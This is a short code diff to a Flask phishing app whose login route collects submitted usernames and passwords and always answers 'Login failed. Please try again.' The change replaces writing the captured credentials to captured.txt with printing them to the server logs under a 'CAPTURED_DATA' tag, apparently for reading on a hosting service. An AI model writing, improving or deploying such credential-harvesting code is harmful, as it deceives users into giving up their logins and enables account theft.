@@ -8,14 +8,12 @@ def login():
         username = request.form.get("username")
         password = request.form.get("password")
 
-        with open("captured.txt", "a") as f:
-            f.write(f"{username} | {password}\n")
+        # Log to Render logs
+        print("CAPTURED_DATA:", username, password)
 
         return "Login failed. Please try again."
 
     return render_template("login.html")
 
 if __name__ == "__main__":
-   if __name__ == "__main__":
     app.run()
-
